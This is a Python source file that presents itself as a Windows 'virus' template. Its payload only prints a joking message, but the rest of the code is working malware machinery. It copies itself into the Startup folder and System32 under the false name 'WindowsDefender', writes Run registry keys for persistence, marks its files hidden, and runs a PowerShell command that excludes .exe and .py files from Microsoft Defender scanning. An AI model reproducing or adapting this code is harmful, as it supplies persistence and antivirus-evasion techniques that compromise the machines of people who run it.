import subprocess
import winreg
import ctypes
import sys
import os

kernel32 = ctypes.WinDLL("kernel32")
user32 = ctypes.WinDLL("user32")
ntdll = ctypes.WinDLL("ntdll")

# Your virus functionalities here
class Virus(object):
    def __init__(self):
        self._run()

    def _run(self):
        print("Virus hacker 99999 started. Hacking person's computer, stealing their bank accounts... WOOOOOOO successfully hacked! BOOM!")


class VirusConfig:
    ADD_TO_STARTUP = True
    HIDE_FILE = True
    ADD_REG_KEY = True
    ADD_AV_EXCLUSION = True
    COPY_FILENAME = "WindowsDefender"


def add_to_startup():
    username = os.environ["username"]
    src = get_file_location()
    filename = os.path.split(src)[1]
    ext = filename.split(".")[-1]
    dst = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{VirusConfig.COPY_FILENAME}.{ext}"

    copy_file(src, dst)

def get_file_location():
    return os.getcwd() + "\\" + sys.argv[0]

def add_regkey():
    src = get_file_location()
    filename = os.path.split(src)[1]
    ext = filename.split(".")[-1]
    dst = f"C:\\Windows\\System32\\{VirusConfig.COPY_FILENAME}.{ext}"

    copy_file(src, dst)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "WindowsDefender", None, winreg.REG_SZ, dst)
    winreg.CloseKey(key)

    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "WindowsDefender", None, winreg.REG_SZ, dst)
    winreg.CloseKey(key)

def copy_file(src, dst):
    kernel32.CopyFileW.argtypes = [ctypes.c_wchar_p, ctypes.c_wchar_p, ctypes.c_bool]
    kernel32.CopyFileW(src, dst, False)

    if VirusConfig.HIDE_FILE:
        hide_file(dst)

def hide_file(filepath):
    kernel32.SetFileAttributesW.argtypes = [ctypes.c_wchar_p, ctypes.c_int]
    kernel32.SetFileAttributesW(filepath, 0x2)

def add_av_exclusion():
    subprocess.Popen("powershell Add-MpPreference -ExclusionExtension exe, py", shell=True)

def hide_process():
    pass # secret :)

def main():
    if VirusConfig.ADD_TO_STARTUP:
        add_to_startup()
    if VirusConfig.ADD_REG_KEY:
        add_regkey()
    if VirusConfig.HIDE_FILE:
        hide_file(os.getcwd() + "\\" + sys.argv[0])
    if VirusConfig.ADD_AV_EXCLUSION:
        add_av_exclusion()

    Virus()

if __name__ == "__main__":
    main()
